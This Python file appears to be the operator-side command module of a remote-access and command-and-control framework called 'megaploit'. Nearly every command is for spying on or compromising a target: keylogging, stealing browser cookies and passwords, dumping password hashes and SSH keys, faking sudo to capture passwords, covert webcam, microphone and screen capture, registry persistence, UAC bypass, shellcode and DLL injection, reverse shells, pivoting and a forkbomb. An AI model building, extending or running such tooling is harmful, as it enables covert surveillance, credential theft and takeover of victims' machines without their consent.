"""
megaploit.server.commands
~~~~~~~~~~~~~~~~~~~~~~~~~
Every command that the operator can run against an active session.

Only C2-specific commands live here — things a plain shell cannot do.
Generic shell work goes through the shell fallback (any unrecognised
token is forwarded as a raw shell command to the agent).
"""

from __future__ import annotations

import logging
import os
import socket
from dataclasses import dataclass
from datetime import datetime, timezone

from megaploit.core.protocol import send_msg, recv_msg, send_file, recv_file
from megaploit.server.session import Session
from megaploit.core.config import MAX_RECORD_SECONDS, AUDIT_LOG
from megaploit.toolbox import runner as _runner


# ---------------------------------------------------------------------------
# Audit logger
# ---------------------------------------------------------------------------

def _setup_cmd_logger() -> logging.Logger:
    os.makedirs(os.path.dirname(AUDIT_LOG) or ".", exist_ok=True)
    logger = logging.getLogger("megaploit.commands")
    if not logger.handlers:
        handler = logging.FileHandler(AUDIT_LOG, encoding="utf-8")
        handler.setFormatter(logging.Formatter(
            "%(asctime)s UTC  %(message)s", datefmt="%Y-%m-%d %H:%M:%S"
        ))
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
    return logger

_cmd_log = _setup_cmd_logger()


def _audit(session: Session, cmd: str, result_ok: bool) -> None:
    status = "OK" if result_ok else "FAIL"
    _cmd_log.info("CMD  session=%d  ip=%-18s  status=%s  cmd=%s",
                  session.id, session.ip, status, cmd[:200])


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass
class CommandResult:
    ok: bool
    output: str = ""
    close_session: bool = False


# ---------------------------------------------------------------------------
# Command registry
# ---------------------------------------------------------------------------

_registry: dict[str, "_CommandDef"] = {}


@dataclass
class _CommandDef:
    name: str
    usage: str
    help_text: str
    dangerous: bool
    handler: object


def _cmd(name: str, usage: str = "", help_text: str = "", dangerous: bool = False):
    def decorator(fn):
        _registry[name] = _CommandDef(name=name, usage=usage,
                                       help_text=help_text, dangerous=dangerous, handler=fn)
        return fn
    return decorator


def _ok(msg: str = "") -> CommandResult:
    return CommandResult(ok=True, output=msg)

def _err(msg: str) -> CommandResult:
    return CommandResult(ok=False, output=msg)


def _recv_file_or_err(conn, local: str, timeout: float | None = None) -> "CommandResult | None":
    """
    Read the agent's FILE_OK / error handshake then pull the file.
    Returns a CommandResult on error, or None on success (caller should
    then return their own _ok()).
    """
    status = recv_msg(conn)
    if status != "FILE_OK":
        return _err(str(status))
    try:
        recv_file(conn, local, timeout=timeout)
        return None
    except (socket.timeout, ConnectionError) as e:
        return _err(f"[-] File receive failed: {e}")


# ---------------------------------------------------------------------------
# Core
# ---------------------------------------------------------------------------

@_cmd("help", usage="help", help_text="Show this help message")
def cmd_help(session: Session, args: list[str]) -> CommandResult:
    lines = ["", f"  {'COMMAND':<36}  DESCRIPTION"]
    lines.append(f"  {'─' * 36}  {'─' * 44}")
    for name, defn in sorted(_registry.items()):
        tag = "  [!]" if defn.dangerous else ""
        lines.append(f"  {defn.usage or name:<36}  {defn.help_text}{tag}")
    lines.append("")
    lines.append("  [!] = Dangerous — requires explicit confirmation")
    lines.append("  Any unrecognised command is forwarded as a raw shell command.")
    lines.append("")
    return _ok("\n".join(lines))


@_cmd("exit", usage="exit", help_text="Terminate the agent session")
def cmd_exit(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "exit")
    return CommandResult(ok=True, output="[*] Session closed.", close_session=True)


@_cmd("sysinfo", usage="sysinfo",
      help_text="OS, hostname, user, arch, Python, CPU%, RAM, disk")
def cmd_sysinfo(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "sysinfo")
    return _ok(recv_msg(session.conn))


@_cmd("cd", usage="cd <directory>", help_text="Change working directory on the target")
def cmd_cd(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: cd <directory>")
    send_msg(session.conn, f"cd {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("shell", usage="shell <command>",
      help_text="Execute a raw shell command (also: just type the command directly)")
def cmd_shell(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: shell <command>")
    send_msg(session.conn, " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# File transfer — uses the binary length-prefix protocol, not shell
# ---------------------------------------------------------------------------

@_cmd("upload", usage="upload <local_file>",
      help_text="Push a local file to the target over the C2 channel")
def cmd_upload(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: upload <local_file>")
    path = args[0]
    if not os.path.isfile(path):
        return _err(f"File not found: {path}")
    send_msg(session.conn, f"upload {os.path.basename(path)}")
    send_file(session.conn, path)
    try:
        ack = recv_msg(session.conn)
    except Exception:
        ack = ""
    return _ok(f"[+] Uploaded '{path}'" + (f"\n    Agent: {ack}" if ack else ""))


@_cmd("download", usage="download <remote_file>",
      help_text="Pull a file from the target over the C2 channel")
def cmd_download(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: download <remote_file>")
    remote = args[0]
    local  = session.download_path(remote)
    send_msg(session.conn, f"download {remote}")
    err = _recv_file_or_err(session.conn, local, timeout=60)
    if err:
        return err
    return _ok(f"[+] Saved to: {local}")


@_cmd("zip_download", usage="zip_download <remote_path>",
      help_text="Zip a directory on the target and pull the archive in one transfer")
def cmd_zip_download(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: zip_download <remote_path>")
    send_msg(session.conn, f"zip_download {args[0]}")
    local = session.download_path(args[0].rstrip("/\\") + ".zip")
    err = _recv_file_or_err(session.conn, local, timeout=120)
    if err:
        return err
    return _ok(f"[+] Archive saved: {local}")


# ---------------------------------------------------------------------------
# Screen / audio capture
# ---------------------------------------------------------------------------

@_cmd("screenshot", usage="screenshot",
      help_text="Capture a full screenshot from the target (saved with PNG metadata)")
def cmd_screenshot(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "screenshot")
    local = session.screenshot_path()
    err = _recv_file_or_err(session.conn, local, timeout=20)
    if err:
        return err
    _embed_screenshot_metadata(local, session)
    return _ok(f"[+] Screenshot saved: {local}")


def _embed_screenshot_metadata(path: str, session: "Session") -> None:
    try:
        from PIL import Image, PngImagePlugin
        img  = Image.open(path)
        meta = PngImagePlugin.PngInfo()
        meta.add_text("Source",     session.ip)
        meta.add_text("CapturedAt", datetime.now(timezone.utc).isoformat())
        meta.add_text("SessionId",  str(session.id))
        img.save(path, pnginfo=meta)
    except Exception:
        pass


@_cmd("screenshot_timelapse", usage="screenshot_timelapse <count> <interval_sec>",
      help_text="Take N silent screenshots every N seconds, zip and pull back")
def cmd_screenshot_timelapse(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2 or not args[0].isdigit() or not args[1].isdigit():
        return _err("Usage: screenshot_timelapse <count> <interval_sec>")
    send_msg(session.conn, f"screenshot_timelapse {args[0]} {args[1]}")
    wait = int(args[0]) * int(args[1]) + 10
    local = session.download_path("timelapse.zip")
    err = _recv_file_or_err(session.conn, local, timeout=wait)
    if err:
        return err
    return _ok(f"[+] Timelapse saved: {local}  ({args[0]} frames, {args[1]}s apart)")


@_cmd("record", usage="record <seconds>",
      help_text="Record microphone audio from the target (max 300s)")
def cmd_record(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or not args[0].isdigit():
        return _err("Usage: record <seconds>")
    seconds = int(args[0])
    if seconds > MAX_RECORD_SECONDS:
        return _err(f"[-] Max {MAX_RECORD_SECONDS}s")
    local = session.recording_path()
    send_msg(session.conn, f"record {seconds}")
    err = _recv_file_or_err(session.conn, local, timeout=seconds + 20)
    if err:
        return err
    return _ok(f"[+] Recording saved: {local}")


@_cmd("mic_level", usage="mic_level",
      help_text="Snapshot the microphone dB level — detect if someone is speaking")
def cmd_mic_level(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "mic_level")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Streaming
# ---------------------------------------------------------------------------

@_cmd("screen_stream", usage="screen_stream <on|off>",
      help_text="Start/stop live desktop MJPEG stream at http://<target>:5000")
def cmd_screen_stream(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return _err("Usage: screen_stream <on|off>")
    send_msg(session.conn, f"screen_stream {args[0]}")
    resp  = recv_msg(session.conn)
    label = "started" if args[0] == "on" else "stopped"
    return _ok(f"[+] Screen stream {label} — {resp}")


@_cmd("webcam", usage="webcam <on|off>",
      help_text="Start/stop live webcam MJPEG stream at http://<target>:5001")
def cmd_webcam(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return _err("Usage: webcam <on|off>")
    send_msg(session.conn, f"webcam {args[0]}")
    resp  = recv_msg(session.conn)
    label = "started" if args[0] == "on" else "stopped"
    return _ok(f"[+] Webcam {label} — {resp}")


# ---------------------------------------------------------------------------
# Persistence / keylogger
# ---------------------------------------------------------------------------

@_cmd("persist", usage="persist <regname> <filename>",
      help_text="Copy agent to AppData and add a Windows Run registry key")
def cmd_persist(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2:
        return _err("Usage: persist <regname> <filename>")
    send_msg(session.conn, f"persist {args[0]} {args[1]}")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_start", usage="keylog_start",
      help_text="Start silent keystroke capture on the target")
def cmd_keylog_start(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_start")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_dump", usage="keylog_dump",
      help_text="Download captured keystrokes from the target")
def cmd_keylog_dump(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_dump")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_stop", usage="keylog_stop",
      help_text="Stop keylogger and delete its log file on the target")
def cmd_keylog_stop(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_stop")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Clipboard
# ---------------------------------------------------------------------------

@_cmd("getclip", usage="getclip",
      help_text="Read the current clipboard contents from the target")
def cmd_getclip(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "getclip")
    return _ok(recv_msg(session.conn))


@_cmd("setclip", usage="setclip <text>",
      help_text="Silently overwrite the target's clipboard with arbitrary text")
def cmd_setclip(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: setclip <text>")
    send_msg(session.conn, "setclip " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Credential harvesting
# ---------------------------------------------------------------------------

@_cmd("hashdump", usage="hashdump",
      help_text="Dump /etc/shadow (Linux) or save SAM+SYSTEM (Windows). Needs root/SYSTEM",
      dangerous=True)
def cmd_hashdump(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "hashdump")
    return _ok(recv_msg(session.conn))


@_cmd("wifi_passwords", usage="wifi_passwords",
      help_text="Extract all saved Wi-Fi SSIDs and passwords (cross-platform)")
def cmd_wifi_passwords(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "wifi_passwords")
    return _ok(recv_msg(session.conn))


@_cmd("browser_history", usage="browser_history [count]",
      help_text="Read Chrome/Firefox/Edge history from SQLite DBs without opening the browser")
def cmd_browser_history(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("browser_history " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("browser_creds", usage="browser_creds [cookies|passwords|all]",
      help_text="Steal all browser cookies + saved passwords from Chrome/Edge/Brave/Opera/Firefox")
def cmd_browser_creds(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("browser_creds " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("search", usage="search <path> <keyword>",
      help_text="Recursively grep file contents on the target (find passwords, keys, secrets)")
def cmd_search(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: search <path> <keyword>")
    send_msg(session.conn, "search " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Network pivoting
# ---------------------------------------------------------------------------

@_cmd("portfwd", usage="portfwd <lport> <rhost> <rport>",
      help_text="Bind a port on the target and relay TCP traffic to an internal host")
def cmd_portfwd(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 3:
        return _err("Usage: portfwd <local_port> <remote_host> <remote_port>")
    send_msg(session.conn, "portfwd " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# User-activity awareness
# ---------------------------------------------------------------------------

@_cmd("idle_time", usage="idle_time",
      help_text="Seconds since last keyboard/mouse input — is someone at the keyboard?")
def cmd_idle_time(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "idle_time")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# GUI interaction
# ---------------------------------------------------------------------------

@_cmd("msgbox", usage="msgbox <title> <message>",
      help_text="Pop a visible dialog box on the target's desktop (distraction / social engineering)")
def cmd_msgbox(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: msgbox <title> <message>")
    send_msg(session.conn, "msgbox " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Code injection (Windows)
# ---------------------------------------------------------------------------

@_cmd("inject_shellcode", usage="inject_shellcode <pid> <hex>",
      help_text="Inject hex-encoded shellcode into a running Windows process via remote thread",
      dangerous=True)
def cmd_inject_shellcode(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2 or not args[0].isdigit():
        return _err("Usage: inject_shellcode <pid> <hex_shellcode>")
    send_msg(session.conn, "inject_shellcode " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Self-destruct
# ---------------------------------------------------------------------------

@_cmd("self_destruct", usage="self_destruct",
      help_text="Wipe agent binary + persistence + keylog, then kill the agent process",
      dangerous=True)
def cmd_self_destruct(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "self_destruct")
    try:
        resp = recv_msg(session.conn)
    except Exception:
        resp = "[*] Agent process terminated."
    return CommandResult(ok=True, output=resp, close_session=True)


# ---------------------------------------------------------------------------
# Evasion
# ---------------------------------------------------------------------------

@_cmd("lock_screen", usage="lock_screen",
      help_text="Lock the target's workstation silently (cover tracks while operating)")
def cmd_lock_screen(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "lock_screen")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Privilege escalation
# ---------------------------------------------------------------------------

@_cmd("token_steal", usage="token_steal [pid]",
      help_text="Steal a SYSTEM process token and impersonate it (Windows, needs admin)",
      dangerous=True)
def cmd_token_steal(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("token_steal " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("uac_bypass", usage="uac_bypass <command>",
      help_text="Bypass UAC on Windows 10/11 via fodhelper registry hijack (no prompts)",
      dangerous=True)
def cmd_uac_bypass(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: uac_bypass <command>")
    send_msg(session.conn, "uac_bypass " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Credential harvesting (advanced)
# ---------------------------------------------------------------------------

@_cmd("cred_vault", usage="cred_vault",
      help_text="Dump Windows Credential Manager (RDP passwords, generic secrets) via ctypes")
def cmd_cred_vault(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "cred_vault")
    return _ok(recv_msg(session.conn))


@_cmd("ssh_harvest", usage="ssh_harvest",
      help_text="Dump all SSH private keys, known_hosts and shell history SSH commands")
def cmd_ssh_harvest(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "ssh_harvest")
    return _ok(recv_msg(session.conn))


@_cmd("sudo_sniff", usage="sudo_sniff [log_path]",
      help_text="Plant a fake sudo wrapper that captures the next password typed (Unix)")
def cmd_sudo_sniff(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("sudo_sniff " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Code execution
# ---------------------------------------------------------------------------

@_cmd("living_off_land", usage="living_off_land <lolbin> <args>",
      help_text="Execute via signed Windows LOLBins (mshta/certutil/rundll32/wmic/…)",
      dangerous=True)
def cmd_living_off_land(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: living_off_land <lolbin> <args>")
    send_msg(session.conn, "living_off_land " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("dll_inject", usage="dll_inject <pid> <dll_path>",
      help_text="Inject a DLL into a Windows process via LoadLibraryA remote thread",
      dangerous=True)
def cmd_dll_inject(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2:
        return _err("Usage: dll_inject <pid> <dll_path>")
    send_msg(session.conn, "dll_inject " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("reverse_shell", usage="reverse_shell <ip> <port>",
      help_text="Open an interactive PTY reverse shell back to operator (separate from C2)",
      dangerous=True)
def cmd_reverse_shell(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2:
        return _err("Usage: reverse_shell <ip> <port>")
    send_msg(session.conn, "reverse_shell " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Pivoting
# ---------------------------------------------------------------------------

@_cmd("socks5", usage="socks5 [port]",
      help_text="Start a SOCKS5 proxy on the target (default 1080) — pivot through the target")
def cmd_socks5(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("socks5 " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Screen recording
# ---------------------------------------------------------------------------

@_cmd("screenrecord", usage="screenrecord <seconds> [fps] [scale_width]",
      help_text="Record the target's desktop as MP4 (default 12 fps, 1280px wide) and pull it back")
def cmd_screenrecord(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: screenrecord <seconds> [fps] [scale_width]")
    seconds = int(args[0])
    local   = session.download_path("screenrec.mp4")
    send_msg(session.conn, f"screenrecord {' '.join(args)}")
    err = _recv_file_or_err(session.conn, local, timeout=seconds + 30)
    if err:
        return err
    return _ok(f"[+] Screen recording saved: {local}")


# ---------------------------------------------------------------------------
# GUI control
# ---------------------------------------------------------------------------

@_cmd("mouse_move", usage="mouse_move <x> <y> [click]",
      help_text="Move the mouse to (x,y) on the target; optionally click")
def cmd_mouse_move(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: mouse_move <x> <y> [click]")
    send_msg(session.conn, "mouse_move " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("type_keys", usage="type_keys text|hotkey <args>",
      help_text="Silently type text or fire a hotkey on the target (e.g. type_keys hotkey win r)")
def cmd_type_keys(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: type_keys text <string>  OR  type_keys hotkey <key> [key2…]")
    send_msg(session.conn, "type_keys " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Destructive
# ---------------------------------------------------------------------------

@_cmd("forkbomb", usage="forkbomb",
      help_text="Crash the target with an infinite process fork (Unix only)",
      dangerous=True)
def cmd_forkbomb(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "forkbomb")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Toolbox
# ---------------------------------------------------------------------------

@_cmd("toolbox_run", usage="toolbox_run <name> [args…]",
      help_text="Run an installed toolbox tool locally, targeting the active session's IP")
def cmd_toolbox_run(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: toolbox_run <tool-name> [args…]")
    lines: list[str] = []
    try:
        _runner.run_local(args[0], args[1:], output=lines.append)
    except RuntimeError as e:
        return _err(str(e))
    return _ok("\n".join(lines))


@_cmd("toolbox_deploy", usage="toolbox_deploy <name> [args…]",
      help_text="Upload a toolbox tool's entry-point to the target and execute it there")
def cmd_toolbox_deploy(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: toolbox_deploy <tool-name> [args…]")
    lines: list[str] = []
    try:
        _runner.run_remote(args[0], args[1:], session, output=lines.append)
    except RuntimeError as e:
        return _err(str(e))
    return _ok("\n".join(lines))


# ---------------------------------------------------------------------------
# Dispatcher
# ---------------------------------------------------------------------------

def dispatch(session: Session, raw: str) -> CommandResult:
    parts = raw.strip().split()
    if not parts:
        return _ok()

    name = parts[0].lower()
    args = parts[1:]

    if name in _registry:
        try:
            result = _registry[name].handler(session, args)
        except ConnectionError:
            result = CommandResult(ok=False, output="[-] Connection lost.", close_session=True)
        except Exception as e:
            result = _err(f"[-] Error: {e}")
    else:
        try:
            send_msg(session.conn, raw)
            result = _ok(recv_msg(session.conn))
        except ConnectionError:
            result = CommandResult(ok=False, output="[-] Connection lost.", close_session=True)
        except Exception as e:
            result = _err(f"[-] Error: {e}")

    _audit(session, raw, result.ok)
    return result


def all_commands() -> dict[str, _CommandDef]:
    return dict(_registry)
